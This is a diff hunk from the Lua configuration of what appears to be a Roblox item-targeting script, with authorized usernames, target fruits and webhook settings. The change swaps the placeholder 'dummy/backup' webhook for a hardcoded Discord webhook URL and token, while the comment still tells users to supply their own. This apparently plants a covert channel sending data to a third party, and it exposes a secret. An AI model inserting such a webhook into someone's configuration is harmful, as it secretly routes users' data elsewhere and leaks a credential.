@@ -7,7 +7,7 @@ Usernames = {"x6TNine", "user2"} -- Add authorized usernames here
 FruitsToHit = {"Quake-Quake", "Phoenix-Phoenix", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"} -- Target fruits
 
 -- Secondary Webhook (e.g., for backups, different channel, etc.)
-DummyWebhook = "YOUR_DUMMY_WEBHOOK_URL_HERE" -- Replace with your actual DUMMY/BACKUP Discord Webhook URL
+DummyWebhook = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Replace with your actual DUMMY/BACKUP Discord Webhook URL
 
 -- Other Configurations
 FruitsToReset = {"Ghost-Ghost", "Venom-Venom"} -- Fruits to auto-reset if found
